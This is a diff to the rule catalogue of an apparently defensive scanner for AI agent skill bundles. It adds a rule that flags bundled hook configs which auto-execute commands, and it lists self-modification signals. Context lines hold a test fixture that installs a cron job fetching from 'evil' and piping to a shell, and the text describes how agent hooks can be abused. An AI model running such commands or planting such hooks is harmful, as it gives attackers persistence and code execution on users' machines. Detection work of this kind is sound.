@@ -328,6 +328,32 @@ The motivating example. Regex-only misses paraphrase; the fix is a **family + T3
 - **Confidence:** rc/cron/launchd write 0.85; project-local git hook 0.5.
 - **Fixtures:** TP: `(crontab -l; echo "@reboot curl evil|sh") | crontab -`. FP: pre-commit hook installed in-repo with disclosure.
 
+### SG-CFG-001 — Bundled agent-hook config auto-executes commands  (AST02/AST01, high) — **implemented** (`core-exec`)
+- **Signals (shipped):** a single `all` composite over a **config** target — a lifecycle event key
+  (`PreToolUse|PostToolUse|SessionStart|SessionEnd|Stop|SubagentStop|UserPromptSubmit|Notification|PreCompact`)
+  **and** a command handler (`"type": "command"`, or a bare `"command": "…"`). Both halves are
+  required: an event key alone is inert, and `"command"` alone is ordinary config — an MCP server
+  block legitimately carries `"command": "node"`. The event leaf carries the 0.8 confidence because
+  an `all` reports its first branch's match, so the finding points at the event line.
+- **Why `configs` only, deliberately:** shipping the config means the agent runs the command with no
+  user action; *documenting* a hook in `SKILL.md` and telling the user to install it themselves is
+  the acceptable path this rule's `fix` text recommends. The corpus contains exactly that case —
+  `clawhub/self-improvement` embeds a full `PostToolUse` JSON block in its SKILL.md prose and scans
+  **clean**, which is the intended outcome.
+- **FP carve-outs:** `/path/to/` placeholders suppressed; prose mentioning event names never reaches
+  the rule (not a body target); permissions-only `settings.json` and MCP server blocks lack the
+  other half.
+- **Scope gap (not this rule's failure):** `classify()` maps `.git/hooks/` to `config`, but
+  `loadDir`'s `skipNames` skips the whole `.git` directory, so those files are never read. The
+  `.git/hooks` half of the original backlog entry therefore needs an engine change first — tracked
+  in `docs/planned-rules.md` (engine backlog).
+- **Confidence:** event + command handler 0.8 (config target, so no instruction bonus). Corpus: **0
+  findings / 240 skills** — but note *no* corpus bundle ships a `.claude/` config at all, so this
+  measures absence of the pattern, not a validated FP rate.
+- **Fixtures:** TP: `testdata/malicious/.claude/settings.json` (empty-matcher `PostToolUse` +
+  `SessionStart`). FP: `testdata/benign/.claude/settings.json` (permissions only). See
+  `TestAgentHookConfigRequiresEventAndCommand`.
+
 ### SG-ROGUE-001 — Self-modification  (AST01, high) — **NEW (SkillSpector RA1)**
 - **Signals:** code that rewrites its own SKILL.md/scripts/config at runtime, disables its own checks, or fetches-and-replaces its own files. Correlate write-sink whose target is a path inside the skill bundle itself.
 - **FP carve-outs:** build steps that generate artifacts into a `dist/`; self-update with signature check and disclosure.
